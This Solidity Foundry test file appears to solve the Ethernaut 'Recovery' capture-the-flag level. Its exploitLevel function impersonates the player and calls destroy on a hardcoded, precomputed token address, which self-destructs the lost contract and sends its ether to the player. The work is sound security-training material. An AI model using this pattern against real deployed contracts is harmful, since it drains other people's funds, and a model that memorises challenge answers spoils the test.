// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Recovery.sol";
import "src/levels/RecoveryFactory.sol";

contract TestRecovery is BaseTest {
    Recovery private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new RecoveryFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Recovery(levelAddress);

        // Check that the contract is correctly setup
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Solve the Challenge
        address payable token = 0x41C3c259514f88211c4CA2fd805A93F8F9A57504;
        SimpleToken(token).destroy(player);

        vm.stopPrank();

        //assertEq(lostContract.balance, 0);
        //assertEq(player.balance, playerBalanceBefore + contractBalanceBefore);
    }
}
